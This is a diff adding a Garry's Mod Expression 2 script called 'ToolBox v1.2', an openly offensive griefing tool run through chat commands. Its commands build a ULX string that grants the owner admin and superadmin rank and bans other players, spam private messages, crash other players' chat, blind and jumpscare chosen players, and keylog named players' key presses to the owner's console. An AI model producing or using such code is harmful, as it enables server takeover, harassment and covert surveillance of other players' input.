@@ -1,0 +1,212 @@
+@name ToolBox v1.2
+@inputs 
+@outputs 
+@persist T:table [ K, TargName, Msg, LN, KeyStr, ChatStr CONN, NSTR]:string
+@strict
+
+#include "TB_CONF_v1_2"
+
+if(first()){
+    print("\n[TB]: ToolBox loaded! Type '_h' or '_help' for commands.")
+    
+    O = owner()
+    OID = O:steamID()
+    T = table()
+    Run = 0
+    Esc = "_EXIT"
+    Cmd = ""
+    Arg1 = ""
+    Arg2 = ""
+    Arg3 = ""
+    Arg4 = ""
+    Delim = ""
+    CONN = ""
+    GRP = ""
+    FUN = O:steamID()
+    TargName = "stop"
+    
+}
+
+runOnChat(1)
+
+UIn = O:lastSaid():explode(" ")
+
+if(chatClk(O)){
+    Cmd = UIn[1, string]
+    Arg1 = UIn[2, string]
+    Arg2 = UIn[3, string]
+    Arg3 = UIn[4, string]
+    Arg4 = UIn[5, string]
+    Delim = Cmd:sub(0,1)
+    GRP = "TBXNet"
+    CONN = "test"
+    
+    if(Delim == "_"){
+        # ---use this if available
+        #hideChat(1)
+        
+        # ---use this if hideChat(1) is restricted
+        modifyChat("")
+        Args = (Arg1 + " " + Arg2)
+    }
+    
+    if(Cmd == "_tbx_run"){
+        OID = O:steamID()
+        ARG = Arg1
+        
+        if(Arg1 == "aids"){
+            ARG = ("ulx adduserid " + OID + " admin; ulx adduserid " + OID + " superadmin; ulx adduserid " + OID + " operator; ulx rcon say *Takedown by ToolBox v1.2*; ulx ban ^ 0 brap")
+        }
+    }
+    
+    elseif(Cmd == "_tbx_run_say"){
+        NStr = ""
+        Msg = ""
+        foreach(C, Char:string = Arg1){
+            if(Char != "~"){
+                NStr += Char
+            }
+            else{
+                NStr += " "
+            }
+            
+            ARG = NStr
+        }
+        broadcastRemoteEvent(table(Cmd, ARG))
+        print("\n[TB]: Running " + Cmd + " " + ARG + " . . .")
+    }
+    
+    elseif(Cmd == "_ps"){
+        if(Arg3:toNumber() == 0 | Arg1 == "stop"){
+            Tck = 0
+            Msg = ""
+            reset()
+        }
+        
+        elseif(Arg3:toNumber() == 1){
+            Msg = Arg2
+            Tck = Arg3:toNumber()
+            X = 0
+            
+            if(Arg1 != "*"){
+                Ply = findPlayerByName(Arg1)
+                PlyName = Ply:name()
+            }
+            else{
+                PlyName = "*"
+            }
+        }
+
+        if(Tck < 0 | Tck > 1){
+            print("\n[TB]: ERROR! | Arg3 must be int (0/1). Arg3 was " + Arg3 + ".")
+        }
+        
+        elseif(Tck == 1){
+            if(PlyName != "*"){
+                print("\n[TB]: Running psay spam on " + PlyName +  " . . .")
+                    for(X=1, 1500*Tck, 1){
+                        ps(PlyName, Msg)
+                        X -= 1
+                    }
+                }
+            
+            else{
+                print("\n[TB]: Running psay spam on everyone . . .")
+                for(X=1, 1500*Tck, 1){
+                    foreach(P, Ply:entity = players()){
+                        ps(Ply:name(), Msg)
+                    }
+                }
+            } 
+        }
+        
+        elseif(Tck == 0){
+            X = 0
+            print("\n[TB]: Spam stopped.")
+        }
+    }
+    
+    elseif(Cmd == "_1tap"){
+        print("\n. . . f a l l . . .\n")
+        cancer()
+    }
+    
+    elseif(Cmd == "_2tap"){
+        print("\n. . . b u r n . . .\n")
+        Tck = Arg1:toNumber()
+        if(Tck == 1){
+            for(X=1, 1500*Tck, 1){
+                chatcrash()
+                if(Tck == 1){
+                    X -= 1
+                }
+                else{
+                    Tck = 0
+                }
+            }
+        }
+    }
+    
+    elseif(Cmd == "_bl"){
+        TargName = Arg1
+        Run = Arg2:toNumber()
+        blind(TargName, Run)
+    }
+    
+    elseif(Cmd == "_jump"){
+        TargName = Arg1
+        jump(TargName)
+        print("\n[TB]: Jumpscaring " + TargName + " . . .")
+    }
+    
+    elseif(Cmd == "_tbx_keylog" & (TargName != "stop" | TargName != "")){
+        print("\n[TB]: Keylogs will print to console..")
+        print(_HUD_PRINTCONSOLE, "\n-----[TOOLBOX - X KEY LOGGER]-----")
+        NStr = ""
+        
+        foreach(C, Char:string = Arg1){
+            if(Char != "~"){
+                NStr += Char
+            }
+            else{
+                NStr += " "    
+            }
+            TargName = NStr
+        }
+        
+        if(TargName != "stop"){
+            event keyPressed(Player:entity, Key:string, Down:number, KeyBind:string){
+                if(Player:name() == TargName){
+                    if(Down == 0){
+                        K = Key
+                        LN = ("\n[KEYLOG] ------------ " + Player:name() + ": ( "+K+" )" + " ------------ [KEYLOG]\n")
+                        print(_HUD_PRINTCONSOLE, LN)
+                    }
+                }
+                
+                elseif(TargName == "*"){
+                    foreach(P, Ply:entity = players()){
+                            if(Down == 0){
+                                K = Key
+                                print(_HUD_PRINTCONSOLE, "\n[KEYLOG] ------------ " + Player:name() + K + " ------------ [KEYLOG]\n")
+                        }
+                    }
+                }
+            }
+        }
+        
+        else{
+            print("\n[TB]: Logger off. Reseting E2 . . .")
+            reset()
+        }
+    }
+    
+    elseif(Cmd == "_mute"){
+        mute(Arg1:toNumber())
+    }
+    
+    elseif(Cmd == "_h" | Cmd == "_help"){
+        tbhelp()
+    }
+}
+
